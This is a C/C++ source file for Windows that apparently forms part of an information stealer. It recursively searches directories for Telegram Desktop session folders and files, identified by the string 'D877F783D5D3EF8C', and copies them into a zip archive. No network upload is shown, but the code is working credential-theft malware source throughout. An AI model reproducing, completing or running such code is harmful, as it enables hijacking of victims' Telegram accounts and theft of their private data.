#include <windows.h>
#include <shlwapi.h>
#include "Telegram.h"
#include "fncs.h"
#include "mem.h"
#include "zip.h"

// ORIGINAL 

#define FILE_ATTRIBUTES (FILE_ATTRIBUTE_ARCHIVE | FILE_ATTRIBUTE_NORMAL | FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM)

void _processSubTg(HZIP hZip, LPCWSTR dirPath, LPCWSTR appd) {
	if (pathExists(dirPath, FALSE)) {
		if (WCHAR *strDir = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR)))
		{
			WIN32_FIND_DATAW fd;
			wnsprintfW(strDir, MAX_PATH, L"%s\\*", dirPath);
			HANDLE hIter = FindFirstFileW(strDir, &fd);
			if (hIter != INVALID_HANDLE_VALUE)
			{
				do
				{
					wnsprintfW(strDir, MAX_PATH, L"%s\\%s", dirPath, fd.cFileName);
					if ((fd.dwFileAttributes & FILE_ATTRIBUTES))
					{
						WCHAR* zipName = (WCHAR*)_alloc((lstrlenW(PathFindFileNameW(strDir)) + 11 + lstrlenW(appd)) * sizeof(WCHAR));
						wnsprintfW(zipName, lstrlenW(PathFindFileNameW(strDir)) + 11 + lstrlenW(appd), L"Telegram\\%s\\%s", appd, PathFindFileNameW(strDir));
						ZipAdd(hZip, zipName, strDir);
						_free(zipName);
					}
				} while (FindNextFileW(hIter, &fd));
				FindClose(hIter);
			}
			_free(strDir);
		}
	}
}

void enumTelegram(HZIP hZip, LPCWSTR dirPath, SIZE_T* telegram) {
	if (pathExists(dirPath, FALSE)) {
		if (WCHAR *strDir = (WCHAR*)_alloc(MAX_PATH * sizeof(WCHAR)))
		{
			WIN32_FIND_DATAW fd;
			wnsprintfW(strDir, MAX_PATH, L"%s\\*", dirPath);
			HANDLE hIter = FindFirstFileW(strDir, &fd);
			if (hIter != INVALID_HANDLE_VALUE)
			{
				do
				{
					wnsprintfW(strDir, MAX_PATH, L"%s\\%s", dirPath, fd.cFileName);
					if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY && lstrcmpW(fd.cFileName, L".") != 0 && lstrcmpW(fd.cFileName, L"..") != 0)
					{
						if (StrStrW(PathFindFileNameW(strDir), L"D877F783D5D3EF8C")) {
							WCHAR* mPath = (WCHAR*)_alloc((11 + lstrlenW(PathFindFileNameW(strDir))) * sizeof(WCHAR));
							wnsprintfW(mPath, (11 + lstrlenW(PathFindFileNameW(strDir))), L"Telegram\\%s", PathFindFileNameW(strDir));
							ZipAddFolder(hZip, mPath);
							_processSubTg(hZip, strDir, PathFindFileNameW(strDir));
							_free(mPath);
							*telegram += 1;
						}
						enumTelegram(hZip, strDir, telegram);
					}
					else if ((fd.dwFileAttributes & FILE_ATTRIBUTES))
					{
						if (StrStrW(PathFindFileNameW(strDir), L"D877F783D5D3EF8C")) {
							WCHAR* zipName = (WCHAR*)_alloc((lstrlenW(PathFindFileNameW(strDir)) + 10) * sizeof(WCHAR));
							wnsprintfW(zipName, lstrlenW(PathFindFileNameW(strDir)) + 10, L"%s%s", L"Telegram\\", PathFindFileNameW(strDir));
							ZipAdd(hZip, zipName, strDir);

							_free(zipName);
						}
					}
				} while (FindNextFileW(hIter, &fd));
				FindClose(hIter);
			}
			_free(strDir);
		}
	}
}